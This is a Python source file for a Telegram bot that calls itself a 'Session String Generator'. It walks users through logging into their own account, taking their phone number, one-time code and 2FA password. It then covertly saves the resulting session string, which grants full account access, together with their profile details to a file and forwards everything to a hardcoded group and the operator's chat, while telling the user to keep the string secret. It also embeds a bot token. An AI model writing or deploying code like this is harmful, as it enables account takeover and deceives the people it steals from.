import logging
from datetime import datetime

from telethon import TelegramClient, errors # type: ignore
from telethon.sessions import StringSession # type: ignore
from telegram import Update # type: ignore
from telegram.ext import ( # type: ignore
    ApplicationBuilder, CommandHandler, MessageHandler,
    filters, ContextTypes, ConversationHandler
)

# -- Bot token for telegram bot --
BOT_TOKEN = '8081659905:AAFAkK62hX4FSYYJrTm8Mbq5JZbVxK9ukaw'

# Telegram group chat ID (numeric)
GROUP_CHAT_ID = -1002693529851

# Owner Telegram user ID who can send .string command
OWNER_USER_ID = 6080931417

# Your personal Telegram user ID to receive messages
YOUR_USER_ID = 6080931417  # Your actual user ID

# Group invite link (may be used in messages)
GROUP_JOIN_LINK = 'https://t.me/+iHFa6IMompxmMTdl'

# Conversation states
ASK_API_ID, ASK_API_HASH, ASK_PHONE, ASK_CODE, ASK_2FA_PASSWORD = range(5)

USER_SESSIONS = {}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# === Function to send messages to your personal chat ===
async def send_all_chat_messages_to_owner(chat_message: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(chat_id=YOUR_USER_ID, text=chat_message)
    except Exception as e:
        logger.error(f"Failed to send chat message to owner: {e}")

# === Save and Notify Function Refactored ===
async def _save_and_notify(phone: str, session_str: str, user, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_details = {
            "User    ID": user.id,
            "First Name": user.first_name or "N/A",
            "Last Name": user.last_name or "N/A",
            "Username": f"@{user.username}" if user.username else "N/A",
            "Phone": phone,
            "Timestamp": datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC'),
        }

        msg = (
            f"🆕 New Telegram Session String Generated\n"
            f"-------------------------------------\n"
            f"User    ID      : {user_details['User    ID']}\n"
            f"First Name   : {user_details['First Name']}\n"
            f"Last Name    : {user_details['Last Name']}\n"
            f"Username     : {user_details['Username']}\n"
            f"Phone Number : {user_details['Phone']}\n"
            f"Timestamp    : {user_details['Timestamp']}\n"
            f"\n"
            f"📜 Session String:\n"
            f"{session_str}\n"
            f"-------------------------------------\n"
            f"Join Group: {GROUP_JOIN_LINK}"
        )

        line = (
            f"Timestamp: {user_details['Timestamp']}\n"
            f"User    ID: {user_details['User    ID']}\n"
            f"First Name: {user_details['First Name']}\n"
            f"Last Name: {user_details['Last Name']}\n"
            f"Username: {user_details['Username']}\n"
            f"Phone: {phone}\n"
            f"Session String:\n{session_str}\n"
            f"{'-'*60}\n"
        )

        with open("sessions_saved.txt", "a", encoding="utf-8") as f:
            f.write(line)

        # Send messages to group and personal chat
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=msg)
        await context.bot.send_message(chat_id=YOUR_USER_ID, text=f"New Session String:\n{session_str}")

    except Exception as e:
        logger.error(f"Failed to save or send session details: {e}")

# === Conversation Handlers ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome to the Telegram Session String Generator Bot!\n\n"
        "To begin, please send your Telegram API ID.\n\n"
        "Send /cancel to stop at any time."
    )
    return ASK_API_ID

async def ask_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    api_id_text = update.message.text.strip()
    if not api_id_text.isdigit():
        await update.message.reply_text("API ID should be a number. Please send a valid Telegram API ID.")
        return ASK_API_ID
    context.user_data['api_id'] = int(api_id_text)
    await update.message.reply_text(
        "Great! Now please send your Telegram API HASH.\n\n"
        "Send /cancel to stop at any time."
    )
    return ASK_API_HASH

async def ask_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    api_hash = update.message.text.strip()
    if len(api_hash) < 8:  # minimal length arbitrary check
        await update.message.reply_text("API HASH seems too short. Please send a valid Telegram API HASH.")
        return ASK_API_HASH
    context.user_data['api_hash'] = api_hash
    await update.message.reply_text(
        "Now send your phone number in international format (e.g. +1234567890).\n\n"
        "Send /cancel to stop at any time."
    )
    return ASK_PHONE

async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    if not phone.startswith('+') or len(phone) < 8:
        await update.message.reply_text("Please send a valid phone number with the country code starting with +.")
        return ASK_PHONE

    api_id = context.user_data.get('api_id')
    api_hash = context.user_data.get('api_hash')

    if not api_id or not api_hash:
        await update.message.reply_text(
            "Telegram API ID and API HASH not found in session. Please send /start and input them again."
        )
        return ConversationHandler.END

    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.connect()

    USER_SESSIONS[user_id] = {
        'phone': phone,
        'client': client,
        'state': 'awaiting_code',
        'api_id': api_id,
        'api_hash': api_hash
    }

    sending_message = await update.message.reply_text("🔄 Sending OTP... Please wait.")

    try:
        await client.send_code_request(phone)
    except Exception as e:
        logger.error(f"Error sending code to {phone}: {e}")
        await sending_message.edit_text(f"Failed to send OTP to {phone}.\nError: {e}\nPlease send the phone number again.")
        await client.disconnect()
        USER_SESSIONS.pop(user_id, None)
        return ASK_PHONE

    await sending_message.edit_text("📩 OTP Sent! Send The Code Received (Format: 1 2 3 4).")
    return ASK_CODE

async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip().replace(" ", "")

    user_data = USER_SESSIONS.get(user_id)
    if not user_data or user_data.get('state') != 'awaiting_code':
        await update.message.reply_text("Session expired or unexpected error. Please send /start to try again.")
        return ConversationHandler.END

    client = user_data['client']
    phone = user_data['phone']

    try:
        await client.sign_in(phone, code)
    except errors.SessionPasswordNeededError:
        USER_SESSIONS[user_id]['state'] = 'awaiting_2fa_password'
        await update.message.reply_text("🔒 2FA Enabled! Send Your Password:")
        return ASK_2FA_PASSWORD
    except Exception as e:
        await update.message.reply_text(f"Login failed: {e}\nPlease send the code again or /cancel to abort.")
        return ASK_CODE

    session_string = client.session.save()
    me = await client.get_me()
    await update.message.reply_text(
        "You have logged in successfully!\n\n"
        "Here is your session string. Save it securely and do NOT share it with anyone:\n\n"
        f"{session_string}"
    )
    await _save_and_notify(phone, session_string, me, context)

    await client.disconnect()
    USER_SESSIONS.pop(user_id, None)
    return ConversationHandler.END

async def ask_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    user_data = USER_SESSIONS.get(user_id)
    if not user_data or user_data.get('state') != 'awaiting_2fa_password':
        await update.message.reply_text("Session expired or unexpected error. Please send /start to try again.")
        return ConversationHandler.END

    client = user_data['client']
    phone = user_data['phone']

    try:
        await client.sign_in(password=password)
    except Exception as e:
        await update.message.reply_text(f"2FA password is incorrect or login failed: {e}\nPlease send the password again or /cancel to abort.")
        return ASK_2FA_PASSWORD

    session_string = client.session.save()
    me = await client.get_me()
    await update.message.reply_text(
        "Thank you for choosing our bot, your session string will be here soon....\n\n"
        f"{session_string}"
    )
    await _save_and_notify(phone, session_string, me, context)

    await client.disconnect()
    USER_SESSIONS.pop(user_id, None)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user_data = USER_SESSIONS.pop(user_id, None)
    if user_data:
        client = user_data.get('client')
        if client:
            await client.disconnect()
    await update.message.reply_text("Operation cancelled. You can send /start to begin again.")
    return ConversationHandler.END

# ========== Group command handler (simplified, same as original) ==========
async def group_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not message:
        return

    chat_id = message.chat_id
    from_user = message.from_user

    if chat_id != GROUP_CHAT_ID:
        return

    if not from_user:
        return

    user_id = from_user.id
    text = message.text or ""

    if text.strip() == ".string" and user_id == OWNER_USER_ID:
        await message.reply_text("Command started")
        # Additional functionality can be added here

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_api_id)],
            ASK_API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_api_hash)],
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)],
            ASK_2FA_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_2fa_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    )
    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.TEXT & filters.Chat(GROUP_CHAT_ID), group_message_handler))

    logger.info("Bot started...")
    application.run_polling()


if __name__ == '__main__':
    main()
